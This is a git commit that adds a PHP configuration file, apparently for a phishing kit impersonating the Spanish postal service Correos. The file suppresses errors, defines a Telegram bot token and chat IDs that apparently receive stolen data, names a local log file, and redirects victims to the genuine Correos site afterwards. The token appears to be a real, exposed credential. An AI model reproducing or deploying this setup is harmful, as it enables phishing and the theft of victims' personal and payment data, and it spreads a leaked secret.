96c2b61eb1821a157af7ee56a55ba3ebae7a2ed2
httpspro46 <115124143+httpspro46@users.noreply.github.com>
2022-10-06 03:16:44 +0200

    Add files via upload

---
+++ conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5681135275:AAHYqZ45LGHVqL-Zl0BFN53uy2whFrx_yFI");
+define("TELEGRAM_CHAT_ID", "1001721708666");
+define("TELEGRAM_CHAT_IDD", "-1001721708666");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
